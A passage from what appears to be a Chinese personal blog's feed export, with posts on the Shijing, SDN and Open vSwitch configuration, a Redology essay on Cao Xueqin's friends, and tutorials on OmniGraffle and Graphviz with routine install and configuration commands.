    <content type="text"><![CDATA[摘要 《诗经》精选 《诗经》的版本问题 《孔丛子·巡狩篇》：“古者天子命史采歌谣，以观民风。” 关于《诗经》中诗的分类，有“四始”之说，即《风》、《大雅》、《小雅》、《颂》的四篇列首位的诗。《国风》按地区划分，包括“周南”、“召南”、“邶风”、“鄘风”、“卫风”、“王风”、“郑风”、“桧风”、“齐风”、“魏风”、“唐风”、“秦风”、“豳风”、“陈风”和“曹风”，共160篇。 《诗经》的版本问题 《小雅》为宴请宾客之乐。《大雅》则是君臣庙堂的典礼之乐，多数是公卿大夫的作品。《颂》是贵族在家庙中敬祖先鬼神，歌颂文治武功的祭祀之乐。《诗经》中的精华部分是《国风》，后人将其与屈原的《离骚》并称为“风骚”。 周南·关雎 关关雎鸠，在河之洲。窈窕淑女，君子好逑。参差荇菜，左右流之。窈窕淑女，寤寐求之。求之不得，寤寐思服。悠哉悠哉，辗转反侧。参差荇菜，左右采之。窈窕淑女，寤寐求之。参差荇菜，左右流之。窈窕淑女，琴瑟友之。参差荇菜，左右芼之。窈窕淑女，鼓瑟乐之。 王风·黍离 彼黍离离，彼稷之苗。行迈靡靡，中心摇摇。知我者，谓我心忧；不止我者，谓我何求。悠悠苍天，此何人哉！彼黍离离，彼稷之穗。行迈靡靡，中心如醉。知我者，谓我心忧；不止我者，谓我何求。悠悠苍天，此何人哉！彼黍离离，彼稷之实。行迈靡靡，中心如噎。知我者，谓我心忧；不止我者，谓我何求。悠悠苍天，此何人哉！ 王风·采葛 彼采葛兮，一日不见，如三月兮。彼采萧兮，一日不见，如三秋兮。彼采艾兮，一日不见，如三岁兮。 齐风·甫田 无田甫田，维莠骄骄。无思远人，劳心忉忉。无田甫田，维莠桀桀。无思远人，劳心怛怛。婉兮娈兮，总角兮，未几见兮，突而弁兮。 魏风·硕鼠 硕鼠硕鼠，无食我黍。三岁贯女，莫我肯顾。逝将去女，适彼乐土。乐土乐土，得我所。硕鼠硕鼠，无食我麦。三岁贯女，莫我肯德。逝将去女，适彼乐国。乐国乐国，爰得我直。硕鼠硕鼠，无食我苗。三岁贯女，莫我肯劳。逝将去女，适彼乐郊。乐郊乐郊，谁之永号。 陈风·月出 月出皎兮，佼人僚兮，舒窈纠兮，劳心悄兮。月出皓兮，佼人兮，舒受兮，劳心兮。月出照兮，佼人僚兮，舒夭绍兮，劳心惨兮。 子曰：“诗三百，一言以蔽之，思无邪”。 小雅·鹿鸣之什 呦呦鹿鸣，食野之苹。我有嘉宾，鼓瑟吹笙。吹笙鼓簧，承筐是将。人之好我，示我周行。呦呦鹿鸣，食野之蒿。我有嘉宾，德音孔昭。视民不恌，君子是则是效。我有旨酒，嘉宾式燕以敖。呦呦鹿鸣，食野之芩。我有嘉宾，鼓瑟鼓琴。鼓瑟鼓琴，和乐且湛。我有旨酒，以燕乐嘉宾之心。 大雅·生民之什·假乐 假乐君子，显显令德。宜民宜人，受禄于天。保右命之，自天申之。 商颂 天命玄鸟，降而生商，宅殷土芒芒。古帝命汤武，正域彼四方。方命厥后，奄有九有。商之先后，受命不殆，在武丁孙子。武丁孙子，武王靡不胜。龙十乘，大是承，邦千里，维民所止，肇域彼四海。四海来假，来假祁祁。景员维河，殷受命咸宜，百禄是何。 扩展阅读 古典音乐低俗史 舞台剧：南海十三郎 电影评论|灵魂解码《林肯》 电影评论|斯皮尔伯格的林肯情怀 风月集|诗三百，思无邪 世纪小说《悲惨世界》 红楼故事：佩刀沽酒作长歌 红楼故事：康熙的秘密情报系统 江南园林鉴赏|南京瞻园 摄影专辑|珠海航空航天展览 参考文献 陆氏草木鸟獣虫鱼疏図解 （影印）| 日本国会图书馆]]></content>
      <tags>
        <tag>Art</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SDN 技术指南（六）：OpenStack or Kubernetes ?]]></title>
    <url>%2F2017%2F10%2F16%2FSDN-Cloud%2F</url>
    <content type="text"><![CDATA[摘要待编辑 SDN 与 OpenStackOpenStack 核心组件 组件 OpenStack实现 AWS实现 备注 计算组件（Compute） Nova EC2 提供按需交付的虚拟机资源 镜像组件（Image） Glance 对象存储组件（Object Storage） Swift S3 无需额外进行文件路径的挂载操作 块存储组件（Block Storage） Cinder EBS 曾用名 Nova-volumem 网络服务组件（Network） Quantum VPC 满足其它组件所需的网络链接要求 仪表盘组件（Dashboard） Horizon Console 管理操作界面 身份识别组件（Identity） Keystone IAM 指定服务目录 SDN 与 KubernetesDiscuss Is Kubernetes Repeating OpenStack’s Mistakes? | Boris Renski on September 7, 2017 AWS or Azure : 云计算平台的趋势分析|Stack Overflow,2017 参考文献 容器化OpenStack对未来架构的影响 | 陈沙克 2016年 OpenStack 总结 | 陈沙克 OpenStack落地的五大难点 | 肖力@云技术实践]]></content>
      <tags>
        <tag>DevOps</tag>
        <tag>网络协议</tag>
        <tag>SDN</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SDN 技术指南（三）：OpenDaylight or Floodlight]]></title>
    <url>%2F2017%2F10%2F16%2FSDN-Controller%2F</url>
    <content type="text"><![CDATA[摘要待编辑 FloodlightInstall &amp; Run12345$ git clone git://github.com/floodlight/floodlight.git$ cd floodlight/$ ant$ java -jar target/floodlight.jar// 默认监听端口 6633 配置 Open vSwitch 连接Floodlight 一个 OVS 可以同时配置一个或者多个控制器 1$ ovs-vsctl set-controller ovs-switch tcp:9.181.137.182:6633 OPNFVebook | Understanding OPNFV Network Functions Virtualization: All Roads Lead to OPNFV 专题合辑：Network Engineering SDN 技术指南（一）: 架构概览 SDN 技术指南（二）：OpenFlow Preview SDN 技术指南（三）：OpenDaylight or Floodlight ? SDN 技术指南（四）：Open vSwitch Preview SDN 技术指南（五）：NFV Preview SDN 技术指南（六）：OpenStack or Kubernetes ? 浅谈基于数据分析的网络态势感知 网络数据包的捕获与分析（libpcap、BPF及gopacket） 新一代Ntopng网络流量监控—可视化和架构分析 Cyber-Security: IPv6 &amp; Security AWS or Azure : 云计算平台的趋势分析|Stack Overflow,2017 Cyber-Security|香港拟增设网络安全与科技罪案总警司 参考文献]]></content>
      <tags>
        <tag>DevOps</tag>
        <tag>网络协议</tag>
        <tag>SDN</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SDN 技术指南（四）：Open vSwitch]]></title>
    <url>%2F2017%2F10%2F13%2FSDN-OpenvSwitch%2F</url>
    <content type="text"><![CDATA[摘要 Open vSwitch 安装 Open vSwitch 命令行 Open vSwitch 运行原理 Open vSwitch 性能监控 前言由之前发布的文章知道 Open vSwitch(Open Source Virtual Switch) 是一款基于软件实现的开源虚拟交换机。 SDN 技术指南（一）: 架构概览 SDN 技术指南（二）: OpenFlow Open Source Virtual Switch:Community-Based, Open Source,. Full-Featured Network Operating System. 一、Open vSwitch 安装12345678910111213# 第一步：Getting the Codegit clone https://git.openswitch.net/openswitch/ops-build# 第一步：选择编译模式# 模式一：To a supported white box switch ( 例如 VMware vSwitch、vDS、Nexus 1000V)make configure genericx86-64# 模式二：OVA （可以直接导入虚拟机，例如 Oracle Virtual box ）make configure appliance# 第三步：打包make 二、Open vSwitch 命令行2.1 核心概念 Bridge ：网桥，对应一个以太网交换机（Switch），一个主机中可以创建一个或者多个 Bridge 设备。 Port ：Port 与物理交换机的端口概念类似, 每个 Port 都属于一个特定的 Bridge 。端口类型：Normal、Internal、Patch、Tunnel。 Interface：接口，对应网卡，即可以是 ovs 生成的虚拟网卡，也可能是挂载在 ovs 的物理网卡。在通常情况下，Port 和 Interface 是一对一的关系, 只有在配置 Port 为 bond 模式后，Port 和 Interface 是一对多的关系。 2.2 基本操作 ovs-vsctl ： 查询和更新 ovs-vswitchd 的配置； ovs-appctl ：发送命令消息，运行相关 daemon； ovsdbmonitor ： GUI工具，可以远程获取 OVS 数据库和 OpenFlow 的流表。 123456789101112# 创建一个新的交换机$ ovs-vsctl add-br ovs-switch# 创建一个端口 设置端口# 如果在创建端口的时候没有指定 OpenFlow 端口编号，会自动生成一个$ ovs-vsctl add-port ovs-switch p0 -- set Interface p0 ofport_request=100# 设置接口类型$ ovs-vsctl set Interface p0 type=internal$ ethtool -i p0# 查看交换机的端口信息$ ovs-ofctl show ovs-switch# 查看 datapath 的信息$ ovs-dpctl show 三、Open vSwitch 运行原理3.1 Open vSwitch 内部结构Open vSwitch 内部分为用户态和内核态。用户层（态）为守护程序实现了交换机和流表，是 Open vSwitch 的核心，提供了一些组件去管理交换机，实现数据库，对内核进行直接管理。主要包含三个守护进程： ovs-vswitched : 主要模块，守护进程，包括一个 Linux 内核模块。 ovsdb-server : 数据库服务,保存相关配置信息 ovs-brcompatd 数据流(flow) 通过 Open vSwitch 转发的流程。每收到一个包之后，OVS Kernel Module 将检查它是否能能命中内核模块的缓存（flow cache) ，如果命中缓存则交由 kernel 处理；如果不能命中缓存则先发送到用户空间（ovs-vswitchd process ）进行转发决策 ——— 基于一系列已经安装配置的规则库（OpenFlow rulues）；如果没有命中任何一条规则，则将包发送给 OpenFlow 控制器处理。一旦做出转发决策，这个包和转发动作将传回 OVS Kernel Module 缓存起来。这条 flow 接下来的包就将命中缓存并直接由 kernel 转发处理。 openvswitch_mod.ko 是内核态(kernel)的主要模块完成数据包的查找、转发、修改等操作，一条 flow 的后续数据包到达 OVS 后将直接交由内核态，使用 openvswitch_mod.ko 中的处理函数对数据包进行处理。 3.2 Open vSwitch 的协议支持情况 GRE-tunneled mirrors: 远程监控 LACP、VLAN、IGMP、LLDP、BFD、STP、RSTP、QoS、HFSC Complete IPv6 (Internet Protocol version 6) support Support for multiple tunneling protocols, including GRE、VXLAN 、STT、IPsec Multi-table forwarding pipeline with a flow-caching engine 3.3 Open vSwitch 的 OpenFlow 支持情况 ovs-openflowd：一个简单的 OpenFlow 交换机； ovs-controller：一个简单的 OpenFlow 控制器； ovs-ofctl 查询和控制 OpenFlow 交换机和控制器； ovs-pki ：OpenFlow 交换机创建和管理公钥框架； ovs-tcpundump：tcpdump 的补丁，解析 OpenFlow 的消息； Open vSwitch support for OpenFlow 1.1 and beyond is a work in progress.&gt;&gt;&gt; OpenFlow Support in Open vSwitch 四、Open vSwitch 性能监控 “If you can’t measure it, you can’t improve it” —— Lord Kelvin 4.1 sFlow 监控示例 启动分析器 sFlow Analyzer (以 sFlow-RT 为例) 12345678910$ cd sflow-rt$ ./start.shbash-3.2$ ./start.sh信息: Listening, sFlow port 6343信息: Listening, HTTP port 8008信息: app/ovs/scripts/status.js started警告: app/ovs/scripts/status.js app/ovs/scripts/status.js信息: app/ovs/scripts/status.js stopped$ ps -ef | grep 6343 501 30565 30431 0 2:45下午 ttys002 0:03.90 /usr/bin/java -Xms200M -Xmx200M -XX:+UseG1GC -XX:MaxGCPauseMillis=100 -Dsflow.port=6343 -Dhttp.port=8008 -jar ./lib/sflowrt.jar Connect Normal Switch to sFlow Analyzer 12345678// 指定 analyzerswitch(root)# sflow collector 10.0.0.1// 数据包采样: 1-in-4096// 常规参考值：[100 Mb/s: 1 in 500]、[1 Bb/s: 1 in 1000]、[10 Gb/s: 1 in 2000]switch(root)# sflow sampling 4096// 轮询计数器 polling counters every 20 secondsswitch(root)# sflow polling 20switch(root)# sflow enable Connect Open vSwitch to sFlow Analyzer 123// e.g. connect Open vSwitch to sFlow analyzerovs-vsctl — –id=@sflow create sflow agent=eth0 \target=\”10.0.0.1:6343\” sampling=1000 polling=20 \— set bridge br0 sflow=@sflow 4.2 Connect Open vSwitch to OpenFlow controller12// e.g. connect Open vSwitch to OpenFlow controllerovs-vsctl set-controller br0 tcp:10.0.0.1:6633 4.3 Traffic analytics : sFlow vs NetFlow sFlow does not use flow cache, so realtime charts more accurately reflect traffic trend NetFlow spikes caused by flow cache active-timeout for long running connections 应用案例 传统券商的互联网技术之路——泛前端、交易云与金融电商 扩展阅读 An Introduction to OVS Architecture | YY哥 OVS 流表原理 | YY哥 扩展阅读：Network Engineering SDN 技术指南（一）: 架构概览 SDN 技术指南（二）：OpenFlow Preview SDN 技术指南（三）：OpenDaylight or Floodlight ? SDN 技术指南（四）：Open vSwitch Preview SDN 技术指南（五）：NFV Preview SDN 技术指南（六）：OpenStack or Kubernetes ? Preview SDN 技术指南（七）：产业联盟与标准化组织 Preview SDN 技术指南（八）：案例 浅谈基于数据分析的网络态势感知 网络数据包的捕获与分析（libpcap、BPF及gopacket） 新一代Ntopng网络流量监控—可视化和架构分析 Cyber-Security: IPv6 &amp; Security AWS or Azure : 云计算平台的趋势分析|Stack Overflow,2017 Cyber-Security|香港拟增设网络安全与科技罪案总警司 参考文献 kontrolissues:Installing OpenSwitch OVS初级教程：使用Open vSwitch构建虚拟网络 基于 Open vSwitch 的 OpenFlow 实践 | IBM@developerworks,2014 Offloading OVS Flow Processing using eBPF | William (Cheng-Chun) Tu VMware | OVS Conference 2016 Traffic visibility and control with sFlow | Peter Phaal InMon Corp. November 2014 Accelerating Open vSwitch to “Ludicrous Speed” | Network Heresy , 2014 Open Virtual Network (OVN) | sflow.com ,2015 Open vSwitch 2014 Fall Conference Open vSwitch 2015 Fall Conference Open vSwitch 2016 Fall Conference]]></content>
      <tags>
        <tag>DevOps</tag>
        <tag>网络协议</tag>
        <tag>SDN</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[红楼故事：佩刀沽酒作长歌]]></title>
    <url>%2F2017%2F10%2F04%2FRedology-DunMing%2F</url>
    <content type="text"><![CDATA[摘要《红楼梦》传世之后，关于作者、写作年代等诸多关键问题多有争议。根据胡适的考证，敦诚、敦敏为曹雪芹好友，与《红楼梦》作者曹雪芹时有往来，交情甚佳。他们之间的唱和诗文是极少数“同时人的证见”，是重要的史料佐证。 爱新觉罗·敦敏（1729年—1796年），清宗室，字子明，号懋斋，曾任右翼宗学总管（宗学，即皇族子弟学堂），著有《懋斋诗钞》。爱新觉罗·敦诚（1734年-1791年），敦敏弟，字敬亭，号松堂，别号佣闲子，著有《四松堂诗文集》。 赠曹雪芹 作者：爱新觉罗·敦敏碧水青山曲径遐，薜萝门巷足烟霞。寻诗人去留僧壁，卖画钱来付酒家。燕市狂歌悲遇合，秦淮残梦忆繁华。新愁旧恨知多少，都付酕醄醉眼斜。 敦敏、敦诚为努尔哈赤第十二子、爱新觉罗·阿济格五世孙。英亲王阿济格可谓沙场勇将、战绩显赫，为大清朝初期平定江山立下了汗马功劳。 “国初开创，栉风沐雨，以百战定天下，繄诸王是庸。” —— 赵尔巽 爱新觉罗·阿济格生于明万历三十九年（1605年）七月十五日 天命十年（1625年，20岁），追杀察哈尔部林丹汗； 天命十一年（1626年，21岁），讨伐喀尔喀巴林部、扎鲁特部，封贝勒； 天聪元年（1627年，22岁），攻朝鲜王朝，连克五城 天聪三年（1629年，24岁），攻锦州、宁远等地, 斩杀明山海关总兵赵率教 天聪四年（1630年，25岁），大凌河会战，北逐明军四十里 崇德二年（1637年，32岁），攻克皮岛； 崇德七年（1642年），大败吴三桂 顺治元年（1644年，39岁），从多尔衮在山海关之战中大败李自成大顺军，封和硕英亲王，序称“八王”。 受命为靖远大将军，率平西王吴三桂、智顺王尚可喜等满、蒙、汉军3万余，自山西入陕，追击李自成大顺军至湖广。 顺治二年（1645年，40岁），俘杀大顺政权的权将军刘宗敏、军师宋献策。招降明宁南侯左良玉的儿子左梦庚、总督袁继咸部的马步兵10万，相继占领河南、湖广、江西、江南的63城。 佩刀质酒歌 作者：爱新觉罗·敦诚秋晓遇雪芹于槐园，风雨淋涔，朝寒袭袂。时主人未出，雪芹酒渴如狂，余因解佩刀沽酒而饮之。雪芹欢甚，作长歌以谢余。余亦作此答之。 我闻贺鉴湖，不惜金龟掷酒垆。又闻阮遥集，直卸金貂作鲸吸。嗟余本非二子狂，腰间更无黄金珰。秋气酿寒风雨恶，满园榆柳飞苍黄。主人未出童子睡，斝干瓮涩何可当！相逢况是淳于辈，一石差可温枯肠。身外长物亦何有？鸾刀昨夜磨秋霜。曹子大笑称“快哉”！击石作歌声琅琅。知君诗胆昔如铁，堪与刀颖交寒光。我有古剑尚在匣，一条秋水苍波凉。君才抑塞倘欲拔，不妨斫地歌王朗。 论出身，曹不过犯官之后，敦敏兄弟为皇室贵胄；论境遇，敦敏为长官——曹雪芹曾在其治下的左翼宗学任满语教习。但是从诗文中可见，敦敏等却相当尊重曹雪芹，敬为“曹子”，并且为曹“解佩刀沽酒”，颇有古侠客肝胆，家先祖遗风。 顺治七年（1650年），多尔衮病危。阿济格因参与密谋摄政王位之事而遭到顺治皇帝幽禁、赐死。阿济格部下皆涉案获罪，许多人被鞭责、革职或是处死、抄家，家人革除宗籍（皇室待遇）。据传阿济格在幽禁期间，不仅没有一丝收敛，反而在监房内私藏大刀，暗掘地道，声称要放火烧毁监房。 乾隆十一年（1746），乾隆皇帝实行“亲亲睦族”政策，为众多皇族宗室平反，重修了阿济格园寝。敦敏家族也恢复了皇室宗籍，享有部分特权，但在皇室中仍处于受排斥的地位，长期在北京闲居。 也许正是双方相似的家世背景，经历过盛极而衰的人情冷暖，才促成了这一段荒村沽酒、纵论红楼的佳话。胡适：“曹雪芹当时已很贫穷，穷的很不像样子了，故敦诚有‘残杯冷炙有德色’的劝诫。…… 曹雪芹在那贫穷潦倒的境遇里，很觉得牢骚抑郁，故不免纵酒狂歌，自寻排遣。” 亦或者说，如果没有这些仗义侠士的物质和精神支持，《红楼》能否成书都不得而知。 “字字看来皆是血，十年辛苦不寻常。” —— 脂砚斋 扩展阅读 红楼故事：佩刀沽酒作长歌 红楼故事：康熙的秘密情报系统 史景迁|《康熙与曹寅》 参考文献]]></content>
      <tags>
        <tag>History</tag>
        <tag>Art</tag>
        <tag>Redology</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数据可视化（一）思维利器 OmniGraffle for Mac 使用指南]]></title>
    <url>%2F2017%2F09%2F15%2FVisualization-OmniGraffle%2F</url>
    <content type="text"><![CDATA[摘要OmniGraffle 是由 The Omni Group 制作的一款绘图软件，它曾获得苹果设计奖。OmniGraffle 可以支持流程图、逻辑图或者网页产品模型设计等，功能非常强大。与 Graffle 对应的是在Windows平台广泛应用的 MS Visio（ Graffle 这个词据说就是为了和Visio区分而硬造出来的），关于这两个产品的用户体验对比，本文会稍有涉及。 关于它的使用细节——术的方面，建议读者直接参考帮助文档或平台上其他作者的教程。本文 重点 想探讨的，是在工程实践中的一些方法论——跟“道”有关的一些个人体会。 首发版本：《最佳工程时间——思维利器 OmniGraffle》| 简书-201601 ，本文有更新修正。 一、思维可视化一般人的大部分思考过程都是杂乱无序的，没有逻辑的，最后也没法形成有效的沉淀，更无法找到清晰的结论。不是所有的人都是天生就有很好的逻辑的，但是逻辑是可以训练的，只要你懂的把自己的思维进行可视化的展示、分析和整理。 常见的思维可视化模型 放射状规整（思维导图、鱼骨图）－－以后专门讨论（例如 MindManager 等） 层次化规则（架构图、组织结构图） 线性化规整（路径图、时间线） 矩阵式规则（SWOT 分析、商业模式画布） 二、数据流概要数据流可以快速梳理出数据流向，顺手还能体现数据模型的结构关系。 三、业务流第一步：确定边界开始可能不太明了，或者中途有新的变更，但是不要紧，只要搞清楚起点和终点，确定边界&amp;关键里程碑，解决从哪里来、到哪里去的终极问题，就能纲举目张画出全局流程图，之后再集中精力各个击破。 第二步：针对不同子流程各个击破 第三步：不仅仅是几个框完成第二步之后，传统语境下的流程图就完成了。但是，作为一个有追求的演员，似乎还可以尝试点什么。突然，一道灵光撞击出来新的想法。事不宜迟，马上记下来。拖几个元素，插入表格、贴上截图，简单的概要原型页就出来了。神来之笔：借用IOS风格的搜索栏，网页原型是不是颇有大写意风格。 第四步：文档归集在工程实践中，项目或产品文档的管理从来都是一个难题。从初识阶段开始，产品、设计、开发、测试、运营团队在组织架构上可能是分离的，大家本能地按自己的风格习惯写文档，即使是最重要的几个文档，也常常是Visio、PowerDesign、Word、PPT等各种格式混杂，每种文档可能还有软件版本的兼容性差异。再加上积年累月的人员更迭、团队重组，各种混乱交接，有时查一个简单的问题，都可能要打开电脑上所有的办公软件、十几个窗口。这是要疯掉的节奏，非常非常低效！基于OmniGraffle良好的兼容特性，完全可以将关键文档整合到一个Graffle文件，不但可以为当前进行的工作中保持迭代、保护成果，还能持续收拢、归纳、索引关键信息，为后续的改进优化打下好的基础。 文档树 开局索引 添加动作 跳转动作特性：切换版面、显示／隐藏图层、运行脚本 多类型分发：支持导出Pdf/PNG/HTML/Graffle模版等 导出文件动作保真：Pdf文件支持亦支持动作跳转 技巧1、构建组件库Graffle和Visio一样，提供了扩展资源库的支持，想要什么组件，搜一搜就有了。然而很多时候，我们面临问题不是缺少资源，而是资源太多，无法快速作出选择。正如制造工厂里的模具，码农的代码库，有逼格的人一定受不了拖个按钮都得搜索、调色半天。Graffle自带的资源、以前设计的组件、搜罗来的图片/PPT/Visio资源，日常工作中新发明的兵器，最好分门别类放到一个专门的版面。从最原始各种大小字体、点、线条、箭头开始，逐渐积累起组件，甚至样板页，不断吸收、调整、优化，愈积愈厚，直至形成自己的风格，是不是有点像逍遥派的北冥神功？当然，不排除牛人们是从一开始就可以开发出好几套不同Style的套装。 检索扩展资源库 Build Style Library 2、技术资产保护对于众多的用户来说，最大限度的复用现有数据成果，对于技术资产保护具有重要意义。包括但不限于不同工具的成果复用和转换，以及能够将存量数据迁移到 OminGraffle 非常重要。原来是 Windows 平台的用户有一个非常友好的特性，即可以在 OmniGraffle 直接打开MS Visio文件,并在此基础上继续编辑。 从MS Visio迁移 从Axure迁移 其它迁移：截图 &amp; 外部图片 3、踩过的坑 自动布局非常坑爹 自动布局的适用场景 OmniGraffle新建文件的初始设置默认是自动布局的。每当你增加一个元素，调整一下位置，command+S , 我去！！刚才的努力白费了，它会按照一套匪夷所思的对齐规则重新布局！ 除了非常简单的图形，是在想不出实际工作中有什么东西是按照经典原型排列的。好吧，我承认，因为这个坑爹的原因。我大概几个月的时间不知道怎么用这玩意，差点放弃！！虽然开始在自动布局上踩了坑，但是这招在某些情况下还是非常有用的，例如下面这个，不是美术系的怎么可能画这么圆? 还是那句话，特性很多，都有适用范围，合适就好。 拓展阅读：工作效率软件 最佳写作实践：从Evernote到Ulysses 高效创作：我的写作工具链 大道至简：我的项目管理工具集 扩展阅读：数据可视化 数据可视化（一）思维利器 OmniGraffle 绘图指南 数据可视化（二）跑步应用Nike+ Running 和 Garmin Mobile 评测 数据可视化（三）基于 Graphviz 实现程序化绘图 数据可视化（四）开源地理信息技术简史（Geographic Information System 数据可视化（五）基于网络爬虫制作可视化图表 数据可视化（六）常见的数据可视化仪表盘(DashBoard) 数据可视化（七）Graphite 体系结构详解 参考文献]]></content>
      <tags>
        <tag>数据可视化</tag>
        <tag>Mac</tag>
        <tag>工具癖</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数据可视化（三）基于 Graphviz 实现程序化绘图]]></title>
    <url>%2F2017%2F09%2F15%2FVisualization-Graphviz%2F</url>
    <content type="text"><![CDATA[摘要 OmniGraffle 和 Graphviz Why draw when you can code? Graphviz 简介 最佳 Graphviz 实践(一)：流程图、数据结构图、网络路径 Trace Route 最佳 Graphviz 实践(二)：复杂社会关系链分析（《红楼梦》、《权力的游戏》） 最佳 Graphviz 实践(三)：机器学习算法-决策树(Decision Tree) 前言我之前在几篇文章新一代Ntopng网络流量监控—可视化和架构分析、 数据可视化（一）思维利器 OmniGraffle 绘图指南 |201601，都曾提到了力导图，在关于 OmniGraffle 的文章结尾还吐槽了一番自动布局按钮的坑。在本文中我力求将这个坑填上。 OmniGraffle 生成自动布局图形的基础是 Graphviz 引擎。Graphviz（Graph Visualization Software）是一个由AT&amp;T实验室启动的开源工具包，能够支持基于 DOT 脚本，文件扩展名通常是 .gv 或 .dot 的描述绘制图形。DOT 是一种文本图形描述语言，将生成的图形转换成多种输出格式的命令行工具，其输出格式包括PostScript，PDF，SVG，PNG，含注解的文本等。DOT 本身非常原始，提供了一种非常简单的描述图形的方法，同时意味着可以在命令行终端使用，或者被其它编程语言调用（Graphviz 就可以作为一个库使用）。这一点非常关键，基于 Graphviz 应用开发者不必掌握布局的复杂算法，而是可以把精力放在业务方面，将最后的图对象交给绘图引擎来处理即可。 有趣的是 Graphviz(Mac 版) 和 OmniGraffle 都曾获得苹果设计奖 Apple Design Awards。 在深入掌握 Graphviz 及其相关衍生应用之前，我们有必要了解一些基础理论 —— 图论(Graph theory)。 一、背景知识：图论(Graph theory) 柯尼斯堡七桥问题 东普鲁士柯尼斯堡（今日俄罗斯加里宁格勒）市区跨普列戈利亚河两岸，河中心有两个小岛。小岛与河的两岸有七条桥连接。在所有桥都只能走一遍的前提下，如何才能把这个地方所有的桥都走遍？ 许多数学家都尝试去寻找这类问题的解决方案，后来发展成为了数学中的图论。图论史上第一篇重要文献是莱昂哈德·欧拉在1736年发表在圣彼得堡科学院的《柯尼斯堡的七桥》。该论文证明了柯尼斯堡七桥问题中，符合条件的走法并不存在，同时提出和解决了一笔画问题。过桥问题可以抽象简化为平面上的点与线组合，每一座桥视为一条线，桥所连接的地区视为点。从这个点出发的线有奇数条称为奇点，从这个点出发的线有偶数条称为偶点。任意一种河──桥图能否全部走一次的判定法则： 如果存在两个以上（不包括两个）奇顶点，路线不存在；且有n个奇顶点的图至少需要n/2笔画出。 1、经典适用场景 路径问题（柯尼斯堡七桥问题），最小生成树问题，斯坦纳树 网络流与匹配问题：最大流问题，最小割问题，最大流最小割定理，最小费用最大流问题，二分图及任意图上的最大匹配，带权二分图的最大权匹配 覆盖问题：最大团、最大独立集、最小覆盖集、最小支配集 2、经典算法 戴克斯特拉算法(D.A) 克鲁斯卡尔算法(K.A) 普里姆算法(P.A) 拓扑排序算法(TSA) 关键路径算法(CPA) 广度优先搜索算法(BFS) 深度优先搜索算法(DFS) 二、Graphviz 简明指南1、Graphviz 布局器总的来说，Graphviz 支持两类图：无向图（graph,用“ - - ”表示节点之间）和 有向图（digraph,用“ -&gt;” 表示节点之间）。顶点和边都具有各自的属性，比如形状，颜色，填充模式，字体，样式等。主要的布局器如下： dot: 默认布局方式，主要用于有向图(directed graphs)； neato：基于 sprint model 模型，又称force-based 或者 energy minimized； twopi：径向布局(radial layouts of graphs)，放射状； circo：圆环布局(circular layout of graphs)； fdp：无向图 (undirected graphs)； sfdp: large undirected graphs patchwork 、squarified tree maps osage 、 dotty：一个用于可视化与修改图形的图形用户界面程序； lefty：一个可以显示 DOT 图形的可编程控件，并允许用户用鼠标在图上执行操作。 2、Hello World!12$ brew install graphviz$ dot -Tpng demo.dot -o demo.png 1234567891011121314151617digraph demo&#123; label=&quot;儿茶酚胺合成代谢路径&quot;; 酪氨酸 -&gt; L多巴 -&gt; 多巴胺 -&gt; 去甲肾上腺素 -&gt; 肾上腺素; 下丘脑 -&gt; 多巴胺; 交感神经元 -&gt; 去甲肾上腺素; 肾上腺髓质 -&gt; 去甲肾上腺素,肾上腺素; 酪氨酸 [label=&quot;酪氨酸&quot;,color=green]; 多巴胺 [label=&quot;多巴胺&quot;, color=red]; 肾上腺素 [label=&quot;肾上腺素&quot;, color=red]; 下丘脑 [shape=box]; 交感神经元 [shape=box]; 肾上腺髓质 [shape=box];&#125; 3、twopi 径向布局12## 缺省为 dot 布局$ dot -Kcirco -Tpng demo.dot -o demo.png 应用场景1、软件工程领域软件工程领域的复杂系统数据结构分析和软件包依赖关系管理。例如 Linux 内核内部结构非常复杂，从概念上就由五个主要的子系统构成：进程调度器模块、内存管理模块、虚拟文件系统、网络接口模块和进程间通信模块。这些模块之间通过函数调用和共享数据结构进行数据交互，在涉及内核版本、应用程序升级等场景中，弄清楚模块之间的依赖关系非常重要。 lsmod 命令用于显示已经加载到内核中的模块的状态信息，Used by表示依赖的内容。通过 lsmod 命令获取依赖信息之后，简单处理就可以转化为图形，而且图形生成的全过程可以由程序固化。 123456789101112131415$ lsmodModule Used byvboxdrv vboxnetadp,vboxnetflt,vboxpcinf_reject_ipv4 ipt_REJECTebtables ebtable_filterip6_tables ip6table_filterip6_udp_tunnel vxlanudp_tunnel vxlanxor btrfsraid6_pq btrfsnf_nat_masquerade_ipv4 ipt_MASQUERADExfrm_algo xfrm_usernf_defrag_ipv4 nf_conntrack_ipv4...... 123456789101112131415digraph kernel&#123; vboxdrv-&gt;vboxnetadp,vboxnetflt,vboxpci; nf_reject_ipv4-&gt;ipt_REJECT; ebtables-&gt;ebtable_filter; ip6_tables-&gt;ip6table_filter; ip6_udp_tunnel-&gt;vxlan; udp_tunnel-&gt;vxlan; xor-&gt;btrfs; raid6_pq-&gt;btrfs; nf_nat_masquerade_ipv4-&gt;ipt_MASQUERADE; xfrm_algo-&gt;xfrm_user; nf_defrag_ipv4-&gt;nf_conntrack_ipv4; ......&#125; 基于 Graphviz 的一个开源项目 PlantUML 支持快速绘制各类 UML 图形：时序图、用例图、类图、活动图、组件图、状态图、对象图等。 1234567891011121314151617181920@startumlscale 600 width[*] -&gt; State1State1 --&gt; State2 : SucceededState1 --&gt; [*] : AbortedState2 --&gt; State3 : SucceededState2 --&gt; [*] : Abortedstate State3 &#123; state &quot;Accumulate Enough Data\nLong State Name&quot; as long1 long1 : Just a test [*] --&gt; long1 long1 --&gt; long1 : New Data long1 --&gt; ProcessData : Enough Data&#125;State3 --&gt; State3 : FailedState3 --&gt; [*] : Succeeded / Save ResultState3 --&gt; [*] : Aborted@enduml 2、通信工程领域 nwdiag 是一个基于 Python 的、支持 Dot 脚本生成网络图的库 结合 GIS 信息追踪网络路由 123pip install nwdiagnwdiag simple.diagnwdiag -Tsvg simple.diag 12345678910111213141516nwdiag &#123; network dmz &#123; address = "210.x.x.x/24" web01 [address = "210.x.x.1"]; web02 [address = "210.x.x.2"]; &#125; network internal &#123; address = "172.x.x.x/24"; web01 [address = "172.x.x.1"]; web02 [address = "172.x.x.2"]; db01; db02; &#125;&#125; 